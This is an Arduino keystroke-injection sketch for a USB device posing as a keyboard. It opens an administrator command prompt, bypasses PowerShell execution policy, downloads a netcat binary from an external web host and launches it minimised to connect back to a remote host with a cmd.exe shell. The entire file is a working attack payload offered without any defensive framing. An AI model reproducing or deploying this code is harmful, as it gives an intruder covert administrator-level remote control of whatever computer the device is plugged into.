#include "Keyboard.h"
/* Init function */
void reverse_shell_admin()
{
// Begining the Keyboard stream
Keyboard.begin();
// Wait 10000ms
delay(10000);
delay(400);
Keyboard.press(KEY_LEFT_GUI);
delay(200);
Keyboard.releaseAll();
delay(200);
Keyboard.print("cmd");
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_SHIFT);
Keyboard.press(KEY_RETURN);
delay(50);
Keyboard.releaseAll();
delay(1500);
typeKey(KEY_LEFT_ARROW);
typeKey(KEY_RETURN);
delay(500);
Keyboard.print("cd / & mkdir win & cd win & echo (wget 'https://perso.telecom-paristech.fr/rguilloteau/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
typeKey(KEY_RETURN);
delay(100);
Keyboard.print("START /MIN a.exe c130-10.enst.fr 8888 -e cmd.exe -d & exit");
typeKey(KEY_RETURN);
// Ending stream
Keyboard.end();
}
